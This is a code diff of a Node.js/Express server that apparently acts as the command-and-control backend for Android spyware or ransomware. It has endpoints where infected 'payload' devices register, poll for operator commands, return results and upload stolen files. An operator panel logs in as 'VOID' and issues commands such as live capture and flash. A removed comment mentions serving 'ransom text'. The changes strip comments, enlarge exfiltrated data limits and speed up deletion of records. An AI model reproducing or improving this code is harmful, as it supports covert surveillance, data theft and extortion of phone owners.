@@ -24,7 +24,7 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
 //   CONFIG
 // ============================================================
 const VALID_IDS = [
-  "48291", "57394", "201019", "91028", "37654",
+  "48291", "57394", "12847", "91028", "37654",
   "84021", "62517", "19483", "75062", "30918",
   "57120", "89643", "26307", "41985", "68210",
   "93574", "14758", "52036", "78419", "36142"
@@ -37,7 +37,7 @@ function validId(id) { return VALID_IDS.includes(id); }
 function now() { return Date.now(); }
 
 // ============================================================
-//   FILE UPLOAD SETUP
+//   FILE UPLOAD
 // ============================================================
 const upload = multer({
   storage: multer.memoryStorage(),
@@ -48,13 +48,12 @@ const upload = multer({
 //   PAYLOAD ENDPOINTS
 // ============================================================
 
-// Payload registers device + binds user_id to android_id (first device wins)
+// Payload registers device + binds user_id to android_id
 app.post('/register', async (req, res) => {
   try {
     const { userId, device, android, battery, network, androidId } = req.body;
     if (!validId(userId)) return res.json({ ok: false, err: 'invalid id' });
 
-    // Check existing binding
     const { data: existing } = await supabase
       .from('devices')
       .select('*')
@@ -62,7 +61,6 @@ app.post('/register', async (req, res) => {
       .maybeSingle();
 
     if (existing) {
-      // If already bound to a different device -> reject
       if (existing.android_id && androidId && existing.android_id !== androidId) {
         return res.json({ ok: false, err: 'code_in_use' });
       }
@@ -70,7 +68,7 @@ app.post('/register', async (req, res) => {
 
     await supabase.from('devices').upsert({
       user_id: userId,
-      android_id: androidId || existing?.android_id || null,
+      android_id: androidId || (existing && existing.android_id) || null,
       device: device || 'unknown',
       android: android || '?',
       battery: battery || '?',
@@ -85,12 +83,11 @@ app.post('/register', async (req, res) => {
   }
 });
 
-// Long-poll for commands (holds connection open up to 25s)
+// Long-poll for commands
 app.get('/commands', async (req, res) => {
   const userId = req.query.device;
   if (!validId(userId)) return res.json({ ok: false, err: 'invalid' });
 
-  // Update last_seen immediately
   await supabase.from('devices')
     .update({ last_seen: now() })
     .eq('user_id', userId);
@@ -98,7 +95,6 @@ app.get('/commands', async (req, res) => {
   const deadline = Date.now() + LONG_POLL_MS;
 
   const check = async () => {
-    // Grab pending undelivered commands
     const { data: cmds } = await supabase
       .from('commands')
       .select('*')
@@ -107,7 +103,6 @@ app.get('/commands', async (req, res) => {
       .order('created_at', { ascending: true });
 
     if (cmds && cmds.length) {
-      // Mark as delivered
       const ids = cmds.map(c => c.id);
       await supabase.from('commands')
         .update({ delivered: true })
@@ -137,7 +132,7 @@ app.post('/result', async (req, res) => {
       user_id: userId,
       cmd_id: cmdId || '',
       cmd: cmd || '',
-      data: (data || '').substring(0, 4000),
+      data: (data || '').substring(0, 6000),
       created_at: now()
     });
 
@@ -147,7 +142,7 @@ app.post('/result', async (req, res) => {
   }
 });
 
-// Payload uploads file -> Supabase Storage
+// Payload uploads file
 app.post('/upload', upload.single('file'), async (req, res) => {
   try {
     const { userId, type } = req.body;
@@ -187,7 +182,7 @@ app.post('/upload', upload.single('file'), async (req, res) => {
   }
 });
 
-// Payload fetches config (ransom text etc)
+// Config endpoint
 app.get('/config', (req, res) => {
   res.json({
     ok: true,
@@ -201,7 +196,6 @@ app.get('/config', (req, res) => {
 //   PANEL ENDPOINTS
 // ============================================================
 
-// Panel login
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
   if (username !== 'VOID') return res.json({ ok: false, err: 'invalid username' });
@@ -209,7 +203,6 @@ app.post('/login', (req, res) => {
   res.json({ ok: true, token: 'void_' + password + '_' + now(), userId: password });
 });
 
-// Panel device list
 app.get('/devices', async (req, res) => {
   try {
     const { data } = await supabase.from('devices').select('*');
@@ -228,7 +221,6 @@ app.get('/devices', async (req, res) => {
   }
 });
 
-// Panel device detail
 app.get('/device', async (req, res) => {
   try {
     const id = req.query.id;
@@ -237,17 +229,21 @@ app.get('/device', async (req, res) => {
     const { data: d } = await supabase.from('devices')
       .select('*').eq('user_id', id).maybeSingle();
 
+    // Only fetch results from the last 60 seconds
+    const since = now() - 60000;
+
     const { data: results } = await supabase.from('results')
       .select('*').eq('user_id', id)
-      .order('created_at', { ascending: false })
+      .gte('created_at', since)
+      .order('created_at', { ascending: true })
       .limit(30);
 
     const { data: uploads } = await supabase.from('uploads')
       .select('*').eq('user_id', id)
-      .order('created_at', { ascending: false })
+      .gte('created_at', since)
+      .order('created_at', { ascending: true })
       .limit(30);
 
-    // Detect live/flash state from recent commands
     const { data: recentCmds } = await supabase.from('commands')
       .select('*').eq('user_id', id)
       .order('created_at', { ascending: false })
@@ -256,8 +252,8 @@ app.get('/device', async (req, res) => {
     let live = false, flash = false;
     if (recentCmds) {
       for (const c of recentCmds) {
-        if (c.cmd === 'live' && !live) { live = c.args === 'on'; }
-        if (c.cmd === 'flash' && !flash) { flash = c.args === 'on'; }
+        if (c.cmd === 'live' && !live) live = c.args === 'on';
+        if (c.cmd === 'flash' && !flash) flash = c.args === 'on';
         if (live && flash) break;
       }
     }
@@ -268,17 +264,17 @@ app.get('/device', async (req, res) => {
       ok: true,
       userId: id,
       online: !!online,
-      device: d?.device,
-      android: d?.android,
-      battery: d?.battery,
-      network: d?.network,
-      lastSeen: d?.last_seen,
+      device: d ? d.device : null,
+      android: d ? d.android : null,
+      battery: d ? d.battery : null,
+      network: d ? d.network : null,
+      lastSeen: d ? d.last_seen : null,
       live: live,
       flash: flash,
-      results: (results || []).reverse().map(r => ({
+      results: (results || []).map(r => ({
         cmd: r.cmd, data: r.data, at: r.created_at
       })),
-      uploads: (uploads || []).reverse().map(u => ({
+      uploads: (uploads || []).map(u => ({
         type: u.type, url: u.url, name: u.name, at: u.created_at
       }))
     });
@@ -288,11 +284,17 @@ app.get('/device', async (req, res) => {
   }
 });
 
-// Panel sends command
 app.post('/send', async (req, res) => {
   try {
     const { userId, cmd, args } = req.body;
     if (!validId(userId)) return res.json({ ok: false });
+
+    // Clear old results for this user before sending new command
+    // (keeps the panel fresh)
+    if (cmd !== 'flash' && cmd !== 'live') {
+      await supabase.from('results').delete().eq('user_id', userId);
+      await supabase.from('uploads').delete().eq('user_id', userId);
+    }
 
     await supabase.from('commands').insert({
       user_id: userId,
@@ -309,11 +311,11 @@ app.post('/send', async (req, res) => {
 });
 
 // ============================================================
-//   CLEANUP (auto-run every hour)
+//   CLEANUP
 // ============================================================
 async function cleanup() {
   try {
-    const cutoff = now() - (24 * 60 * 60 * 1000); // 24h ago
+    const cutoff = now() - (12 * 60 * 60 * 1000); // 12h
     await supabase.from('results').delete().lt('created_at', cutoff);
     await supabase.from('commands').delete().lt('created_at', cutoff).eq('delivered', true);
     console.log('cleanup done');
